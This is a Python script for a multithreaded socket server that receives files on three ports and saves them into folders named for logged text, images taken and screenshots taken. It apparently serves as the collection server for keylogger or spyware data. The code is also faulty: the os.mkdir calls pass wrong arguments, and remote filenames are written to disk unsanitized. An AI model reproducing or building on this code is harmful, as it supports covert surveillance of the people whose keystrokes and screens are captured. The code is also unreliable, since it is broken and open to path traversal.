#separate socket for each operation for the multithreaded element
#each socket is going to have to be on its own thread.
#look into the logging library to log all of teh information

import socket
import os
import threading
from time import sleep
from math import ceil

def logged_text():
    logged_text_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    logged_text_port = 65432
    host = 'localhost'
    logged_text_socket.bind((host, logged_text_port))

    print("waiting for a connection from logged_text_socket")
    logged_text_socket.listen()

    print("waiting for a connection from logged_text_socket")
    
    conn, addr = logged_text_socket.accept()
    print(addr, "Has connected to the server. (incomming ip, from this port)")

    print(addr, "Has connected to the logged_text_socket. (incomming ip, from this port)")
    os.mkdir(os.path.expanduser('~'), 'logged_text')
    os.chdir('logged_text')
    
    #the start of the file writing process
    while True:
        filename = conn.recv(2084).decode()
        sleep(1)
        filesize = conn.recv(2048).decode()
        packetAmmount = ceil(int(filesize)/2048)

        if (os.path.isfile('new_' + filename)):
            x = 1
            while(os.path.isfile('new_' + str(x) + filename )):
                x += 1
            f = open('new_' + str(x) + filename, 'wb')

        else:
            f = open("new_" + filename, 'wb')
        
        for x in range (0, packetAmmount):
            data = conn.recv(2048)
            f.write(data)
        
        f.close()
#--------------------------------------------------------------------------------------------------------
def images_taken():
    images_taken_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = 'localhost'
    images_taken_port = 16543
    images_taken_socket.bind((host, images_taken_port))
    
    print("waiting for a connection from images_taken_socket")
    images_taken_socket.listen()

    conn, addr = images_taken_socket.accept()
    print(addr, "Has connected to the images_taken_socket. (incomming ip, from this port)")
   
    os.mkdir(os.path.expanduser('~'), 'images_taken')
    os.chdir('images_taken')
    
    #the start of the file writing process
    while True:
        filename = conn.recv(2084).decode()
        sleep(1)
        filesize = conn.recv(2048).decode()
        packetAmmount = ceil(int(filesize)/2048)
        
        if (os.path.isfile('new_' + filename)):
            x = 1
            while(os.path.isfile('new_' + str(x) + filename )):
                x += 1
            f = open('new_' + str(x) + filename, 'wb')

        else:
            f = open("new_" + filename, 'wb')
        
        for x in range (0, packetAmmount):
            data = conn.recv(2048)
            f.write(data)
        
        f.close()
#--------------------------------------------------------------------------------------------------------
def screenshots_taken():
    screenshots_taken_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = 'localhost'
    screenshots_taken_port = 27654
    screenshots_taken_socket.bind((host, screenshots_taken_port))
    
    print("waiting for a connection from screenshots_taken_socket")
    screenshots_taken_socket.listen()
    
    conn, addr = screenshots_taken_socket.accept()
    print(addr, "Has connected to the screenshots_taken_socket. (incomming ip, from this port)")
    
    os.mkdir(os.path.expanduser('~'), 'screenshots_taken')
    os.chdir('screenshots_taken')
    
    #the start of the file writing process
    while True:
        filename = conn.recv(2084).decode()
        sleep(1)
        filesize = conn.recv(2048).decode()
        packetAmmount = ceil(int(filesize)/2048)
        
        if (os.path.isfile('new_' + filename)):
            x = 1
            while(os.path.isfile('new_' + str(x) + filename )):
                x += 1
            f = open('new_' + str(x) + filename, 'wb')

        else:
            f = open("new_" + filename, 'wb')
        
        for x in range (0, packetAmmount):
            data = conn.recv(2048)
            f.write(data)
        
        f.close()
#--------------------------------------------------------------------------------------------------------



logged_text_thread = threading.Thread(target=logged_text)
images_taken_thread = threading.Thread(target=images_taken)
screenshots_taken_thread = threading.Thread(target=screenshots_taken)

logged_text_thread.start()
images_taken_thread.start()
screenshots_taken_thread.start()
